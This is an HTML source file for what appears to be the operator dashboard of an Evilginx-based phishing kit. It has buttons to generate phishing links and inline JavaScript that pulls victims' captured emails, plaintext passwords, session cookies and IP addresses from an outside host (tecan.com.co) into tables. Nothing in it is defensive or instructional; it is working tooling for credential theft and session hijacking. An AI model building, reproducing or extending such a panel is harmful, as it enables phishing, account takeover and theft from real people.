<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dashboard | Evilginx</title>
  <link rel="stylesheet" href="styles.css" />
  <!-- Load Firebase compat SDKs and our scripts -->
  <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
  <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
  <script defer src="firebase-config.js"></script>
  <script defer src="script.js"></script>
</head>
<body>
  <div class="sidebar">
    <!-- "Generate Link" redirects to Dashboard2 for phishlet selection -->
    <button class="menu-btn" onclick="window.location.href='dashboard2.html'">Generate Link</button>
    <button class="menu-btn" onclick="viewCapturedSessions()">Captured Sessions</button>
    <button class="menu-btn" onclick="viewGeneratedLinks()">Generated Links</button>
    <button class="menu-btn" onclick="logout()">Logout</button>
  </div>
  
  <div class="content">
    <h2>Dashboard</h2>
    <p>Welcome! Use the sidebar to view captured data.</p>
    
    <h3>Captured Sessions</h3>
    <table>
      <thead>
        <tr>
          <th>Email</th>
          <th>Password</th>
          <th>Cookies</th>
          <th>IP</th>
          <th>Timestamp</th>
        </tr>
      </thead>
      <tbody id="capturedSessions">
        <!-- Captured sessions will be populated here -->
      </tbody>
    </table>
    
    <h3>Generated Links History</h3>
    <table>
      <thead>
        <tr>
          <th>Phishlet</th>
          <th>URL</th>
          <th>Timestamp</th>
          <th>IP Address</th>
        </tr>
      </thead>
      <tbody id="generatedLinks">
        <!-- Generated links history will be populated here -->
      </tbody>
    </table>
  </div>

  <script>
    // Fetch and display generated links
    function viewGeneratedLinks() {
      fetch("https://tecan.com.co/generated_links_history")
        .then(response => response.json())
        .then(data => {
          const tableBody = document.getElementById("generatedLinks");
          tableBody.innerHTML = ""; // Clear previous data
          data.forEach(link => {
            const row = `<tr>
              <td>${link.phishlet}</td>
              <td><a href="${link.link}" target="_blank">${link.link}</a></td>
              <td>${link.timestamp}</td>
              <td>${link.ip}</td>
            </tr>`;
            tableBody.innerHTML += row;
          });
        })
        .catch(error => console.error("Error fetching generated links:", error));
    }

    // Fetch and display captured sessions
    function viewCapturedSessions() {
      fetch("https://tecan.com.co/captured_sessions")
        .then(response => response.json())
        .then(data => {
          const tableBody = document.getElementById("capturedSessions");
          tableBody.innerHTML = ""; // Clear previous data
          data.forEach(session => {
            const row = `<tr>
              <td>${session.email}</td>
              <td>${session.password}</td>
              <td>${session.cookies}</td>
              <td>${session.ip}</td>
              <td>${session.timestamp}</td>
            </tr>`;
            tableBody.innerHTML += row;
          });
        })
        .catch(error => console.error("Error fetching captured sessions:", error));
    }
  </script>
</body>
</html>
